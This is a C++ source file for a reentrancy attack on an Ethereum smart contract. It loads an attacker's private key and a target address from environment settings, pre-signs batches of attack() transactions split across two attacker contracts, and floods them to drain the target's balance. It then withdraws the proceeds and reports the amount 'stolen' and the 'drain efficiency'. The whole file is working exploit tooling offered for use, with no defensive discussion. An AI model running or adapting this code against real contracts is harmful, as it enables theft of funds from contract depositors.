#include <atomic>
#include <chrono>
#include <future>
#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <spdlog/spdlog.h>
#include "dotenv.h"

import evm_utils;

static void logBalances(const std::string_view rpcEndpoint, const std::string_view targetAddress,
                        const std::string_view attackerContract1, const std::string_view attackerContract2, int round) {
    auto targetBalance = std::async(std::launch::async, [&] { return getContractBalance(rpcEndpoint, targetAddress); });
    auto contract1Balance
            = std::async(std::launch::async, [&] { return getContractBalance(rpcEndpoint, attackerContract1); });
    auto contract2Balance
            = std::async(std::launch::async, [&] { return getContractBalance(rpcEndpoint, attackerContract2); });
    const uint64_t targetBalanceValue = targetBalance.get();
    const uint64_t contract1BalanceValue = contract1Balance.get();
    const uint64_t contract2BalanceValue = contract2Balance.get();
    spdlog::info("Round {} summary: Vulnerable = {:.2f} ETH | AttackerC_1 = {:.2f} ETH | "
                 "AttackerC_2 = {:.2f} ETH | Total_stolen = {:.2f} ETH\n",
                 round, weiToEth(targetBalanceValue), weiToEth(contract1BalanceValue), weiToEth(contract2BalanceValue),
                 weiToEth(contract1BalanceValue + contract2BalanceValue));
}

static uint64_t calculateRequiredTxs(const std::string_view rpcEndpoint, const std::string_view targetAddress,
                                     const std::string_view attackerContract1, const std::string_view attackerContract2) {
    auto targetBalance = std::async(std::launch::async, [&] { return getContractBalance(rpcEndpoint, targetAddress); });
    auto contract1Balance
            = std::async(std::launch::async, [&] { return getContractBalance(rpcEndpoint, attackerContract1); });
    auto contract2Balance
            = std::async(std::launch::async, [&] { return getContractBalance(rpcEndpoint, attackerContract2); });
    const uint64_t targetBalanceValue = targetBalance.get();
    if (targetBalanceValue == 0 || targetBalanceValue < MIN_ATTACK_THRESHOLD_WEI) {
        spdlog::info("Vulnerable contract balance too low for attack. Balance: {:.9f} ETH", weiToEth(targetBalanceValue));
        return 0;
    }
    uint64_t txs = 0;
    uint64_t remaining = targetBalanceValue;
    uint64_t currentDrainAmount = DISPUTE_AMOUNT_WEI;
    while (remaining > 0 && txs < MAX_ATTACK_TRANSACTIONS) {
        if (remaining >= currentDrainAmount) {
            remaining -= currentDrainAmount;
            txs++;
            currentDrainAmount = DISPUTE_AMOUNT_WEI << 1;
        } else {
            txs++;
            break;
        }
    }
    return txs + ATTACK_SAFETY_BUFFER_TXS;
}

static std::vector<std::string> precomputeSignedTxs(const std::string_view rpcEndpoint, const SecureString &privateKey,
                                                    const uint64_t chainId, const std::vector<std::string> &contracts,
                                                    const uint64_t startingNonce, uint64_t txCount,
                                                    const std::string_view senderAddress) {
    spdlog::info("Pre-computing {} transactions...", txCount);
    constexpr std::string_view functionSignature = "attack()";
    const auto encodedCall
            = evm_codec::FunctionEncoder::encodeFunctionCall(std::string{functionSignature}, {}, {}, keccakHash);
    const auto [maxPriorityFeePerGas, maxFeePerGas] = getGasFees(rpcEndpoint, true);
    const auto gasEstimateStr = estimateTxGas(rpcEndpoint, senderAddress, contracts[0], "0x0", encodedCall);
    const uint64_t gasInt = evm_codec::safeHexToUint64(gasEstimateStr);
    const auto gasLimit = formatHexValue(static_cast<uint64_t>(static_cast<double>(gasInt) * GAS_LIMIT_BUFFER));
    std::vector<std::string> signedTxs(txCount);
    const size_t threadCount = std::min(std::thread::hardware_concurrency(), static_cast<unsigned>(MAX_COMPUTE_THREADS));
    const size_t chunkSize = (txCount + threadCount - 1) / threadCount;
    std::vector<std::thread> workers;
    workers.reserve(threadCount);
    auto worker = [&](const size_t start, const size_t end) {
        for (size_t i = start; i < end && i < txCount; ++i) {
            const std::string &currentContract = contracts[i & 1];
            const uint64_t currentNonce = startingNonce + i;
            const std::string nonceHex = formatHexValue(currentNonce);
            signedTxs[i] = createSignedTx(privateKey, chainId, nonceHex, maxPriorityFeePerGas, maxFeePerGas, gasLimit,
                                          currentContract, "0x0", encodedCall);
        }
    };
    for (size_t t = 0; t < threadCount; ++t) {
        size_t start = t * chunkSize;
        size_t end = std::min((t + 1) * chunkSize, txCount);
        if (start < txCount) {
            workers.emplace_back(worker, start, end);
        }
    }
    for (auto &thread: workers) {
        thread.join();
    }
    return signedTxs;
}

static std::pair<std::vector<std::string>, std::chrono::steady_clock::time_point>
sendBatchTxs(const std::string_view rpcEndpoint, const std::vector<std::string> &signedTxs) {
    const size_t totalCount = signedTxs.size();
    std::vector<std::future<std::string>> sends;
    sends.reserve(totalCount);
    const auto launchStartTime = std::chrono::steady_clock::now();
    std::chrono::steady_clock::time_point firstTxTime;
    bool firstTxSent = false;
    for (size_t i = 0; i < totalCount; ++i) {
        if (!firstTxSent) {
            firstTxTime = std::chrono::steady_clock::now();
            firstTxSent = true;
        }
        auto sendFuture = sendRawTx(rpcEndpoint, signedTxs[i]);
        sends.push_back(std::move(sendFuture));
    }
    const auto launchEndTime = std::chrono::steady_clock::now();
    std::vector<std::string> txHashes(totalCount);
    std::atomic<size_t> successCount{0};
    std::vector<std::pair<size_t, std::string>> successfulTxs;
    std::mutex resultMutex;
    for (size_t i = 0; i < sends.size(); ++i) {
        try {
            if (auto txHash = sends[i].get(); !txHash.empty()) {
                txHashes[i] = txHash;
                ++successCount;
                std::lock_guard lock(resultMutex);
                successfulTxs.emplace_back(i, txHash);
            }
        } catch (const std::exception &e) {
            spdlog::debug("Transaction {} failed: {}", i + 1, e.what());
        }
    }
    spdlog::info("Launched {} transactions in {:.2f}ms", totalCount,
                 std::chrono::duration<double, std::milli>(launchEndTime - launchStartTime).count());
    for (const auto &[idx, hash]: successfulTxs) {
        int contractNum = idx % 2 + 1;
        spdlog::info("ROUND {}: attack() call in contract {} | Tx: {}", idx + 1, contractNum, hash);
    }
    spdlog::info("Successfully sent {}/{} transactions", successCount.load(), totalCount);
    std::vector<std::string> resultHashes;
    resultHashes.reserve(successCount);
    for (const auto &hash: txHashes) {
        if (!hash.empty()) {
            resultHashes.push_back(hash);
        }
    }
    return {resultHashes, firstTxTime};
}

static std::pair<int, std::chrono::steady_clock::time_point> processTxReceipts(const std::string_view rpcEndpoint,
                                                                               const std::vector<std::string> &txHashes) {
    if (txHashes.empty())
        return {0, std::chrono::steady_clock::now()};
    std::vector<std::future<bool>> receipts;
    receipts.reserve(txHashes.size());
    for (const auto &hash: txHashes) {
        receipts.push_back(waitForConfirmation(rpcEndpoint, hash));
    }
    std::atomic<size_t> successCount{0};
    std::atomic<size_t> failureCount{0};
    std::chrono::steady_clock::time_point lastConfirmationTime;
    std::mutex timeMutex;
    for (size_t i = 0; i < receipts.size(); ++i) {
        try {
            if (receipts[i].get()) {
                ++successCount;
            } else {
                ++failureCount;
                spdlog::warn("ROUND {} tx reverted", i + 1);
            }
        } catch (const std::exception &) {
            ++failureCount;
            spdlog::warn("ROUND {} tx reverted", i + 1);
        }
        std::lock_guard lock(timeMutex);
        lastConfirmationTime = std::chrono::steady_clock::now();
    }
    int completedRounds = static_cast<int>(successCount.load());
    spdlog::info("Completed {} attack rounds", completedRounds);
    return {completedRounds, lastConfirmationTime};
}

int main() {
    try {
        spdlog::set_level(spdlog::level::info);
        dotenv::init("../.env");
        const auto chainIdStr = dotenv::getenv("CHAIN_ID");
        const uint64_t chainId = std::stoull(chainIdStr);
        const auto chainIdHex = formatHexValue(chainId);
        const auto rpcEndpoint = dotenv::getenv("RPC_URL");
        const auto privateKey = loadPrivateKey("ATTACKER_PRIVATE_KEY");
        const auto attackerAddress = dotenv::getenv("ATTACKER_ADDRESS");
        const auto targetContract = dotenv::getenv("TARGET_CONTRACT");
        const auto attackerContract1 = dotenv::getenv("ATTACKER_CONTRACT_1");
        const auto attackerContract2 = dotenv::getenv("ATTACKER_CONTRACT_2");
        if (chainIdStr.empty() || rpcEndpoint.empty() || attackerAddress.empty() || targetContract.empty()
            || attackerContract1.empty() || attackerContract2.empty()) {
            throw std::runtime_error("Required environment variables not found");
        }
        AddressValidator::validateOrThrow(attackerAddress, "attacker wallet");
        AddressValidator::validateOrThrow(targetContract, "vulnerable contract");
        AddressValidator::validateOrThrow(attackerContract1, "attacker contract 1");
        AddressValidator::validateOrThrow(attackerContract2, "attacker contract 2");
        g_nonceManager.setCurrentAddress(attackerAddress);
        spdlog::info("Reentrancy attack initial state:");
        spdlog::info("Vulnerable contract: {}", targetContract);
        spdlog::info("Attacker contract 1: {}", attackerContract1);
        spdlog::info("Attacker contract 2: {}", attackerContract2);
        auto balanceCheck = std::async(std::launch::async, [&] {
            auto targetBalance
                    = std::async(std::launch::async, [&] { return getContractBalance(rpcEndpoint, targetContract); });
            auto walletBalance
                    = std::async(std::launch::async, [&] { return getAccountBalance(rpcEndpoint, attackerAddress); });
            return std::make_tuple(targetBalance.get(), walletBalance.get());
        });
        const auto [initialTargetBalance, initialWalletBalanceStr] = balanceCheck.get();
        const uint64_t initialWalletBalance = evm_codec::safeHexToUint64(initialWalletBalanceStr);
        spdlog::info("Initial Vulnerable contract balance: {:.2f} ETH", weiToEth(initialTargetBalance));
        spdlog::info("Initial Attacker wallet balance: {:.2f} ETH", weiToEth(initialWalletBalance));
        logBalances(rpcEndpoint, targetContract, attackerContract1, attackerContract2, 0);
        if (uint64_t requiredTxs = calculateRequiredTxs(rpcEndpoint, targetContract, attackerContract1, attackerContract2);
            requiredTxs == 0) {
            spdlog::info("No transactions needed... vulnerable contract is empty or has low balance");
            return 0;
        } else {
            spdlog::info("Calculated required transactions: {} (+{} added for safety)",
                         requiredTxs - ATTACK_SAFETY_BUFFER_TXS, ATTACK_SAFETY_BUFFER_TXS);
            const auto nonceStr = getAddressNonce(rpcEndpoint, attackerAddress);
            const uint64_t startingNonce = evm_codec::safeHexToUint64(nonceStr);
            g_nonceManager.initialize(attackerAddress, startingNonce);
            const std::vector contracts = {attackerContract1, attackerContract2};
            auto signedTxs = precomputeSignedTxs(rpcEndpoint, privateKey, chainId, contracts, startingNonce, requiredTxs,
                                                 attackerAddress);
            spdlog::info("- STARTING ATTACK! -");
            auto [allTxHashes, firstTxTime] = sendBatchTxs(rpcEndpoint, signedTxs);
            auto [completedRounds, lastTxConfirmedTime] = processTxReceipts(rpcEndpoint, allTxHashes);
            auto attackDuration = std::chrono::duration<double, std::milli>(lastTxConfirmedTime - firstTxTime);
            spdlog::info("Attack duration: {:.2f}ms", attackDuration.count());
            std::this_thread::sleep_for(std::chrono::seconds(2));
            logBalances(rpcEndpoint, targetContract, attackerContract1, attackerContract2, completedRounds);
        }
        spdlog::info("- ATTACKER CONTRACTS WITHDRAWAL -");
        const auto updatedNonceStr = getAddressNonce(rpcEndpoint, attackerAddress);
        g_nonceManager.setCurrentAddress(attackerAddress);
        g_nonceManager.initialize(attackerAddress, evm_codec::safeHexToUint64(updatedNonceStr));
        withdrawAttackerContracts(rpcEndpoint, privateKey, chainIdHex, attackerContract1, attackerContract2,
                                  attackerAddress);
        std::this_thread::sleep_for(std::chrono::seconds(POST_ATTACK_DELAY_SECONDS));
        auto finalBalanceCheck = std::async(std::launch::async, [&] {
            auto targetBalance
                    = std::async(std::launch::async, [&] { return getContractBalance(rpcEndpoint, targetContract); });
            auto walletBalance
                    = std::async(std::launch::async, [&] { return getAccountBalance(rpcEndpoint, attackerAddress); });
            return std::make_tuple(targetBalance.get(), walletBalance.get());
        });
        const auto [finalTargetBalance, finalWalletBalanceStr] = finalBalanceCheck.get();
        const uint64_t finalWalletBalance = evm_codec::safeHexToUint64(finalWalletBalanceStr);
        const uint64_t totalStolen
                = initialTargetBalance > finalTargetBalance ? initialTargetBalance - finalTargetBalance : 0;
        const int64_t walletGain = static_cast<int64_t>(finalWalletBalance) - static_cast<int64_t>(initialWalletBalance);
        std::cout << '\n';
        spdlog::info("- FINAL RESULTS -");
        spdlog::info("Initial Attacker wallet balance: {:.2f} ETH", weiToEth(initialWalletBalance));
        spdlog::info("Final Attacker wallet balance: {:.2f} ETH", weiToEth(finalWalletBalance));
        spdlog::info("Net wallet gain: {} {:.2f} ETH", walletGain >= 0 ? "+" : "-",
                     walletGain >= 0 ? weiToEth(static_cast<uint64_t>(walletGain))
                                     : weiToEth(static_cast<uint64_t>(-walletGain)));
        spdlog::info("Total stolen from Vulnerable contract: {:.2f} ETH", weiToEth(totalStolen));
        spdlog::info("Drain efficiency: {:.2f}%",
                     initialTargetBalance > 0
                             ? static_cast<double>(totalStolen) / static_cast<double>(initialTargetBalance) * 100.0
                             : 0.0);
        if (finalTargetBalance == 0) {
            spdlog::info("Attack successful! All funds drained from the vulnerable contract :)");
        } else if (finalTargetBalance < initialTargetBalance) {
            spdlog::warn("Incomplete attack... the vulnerable contract has remaining funds, but if it has less than "
                         "0.0001 ETH, the attack worked as intended by the smart contract's logic");
        } else {
            spdlog::error("Failed attack... something went wrong :(");
        }
        return 0;
    } catch (const std::exception &e) {
        spdlog::error("Critical error: {}", e.what());
        return 1;
    }
}
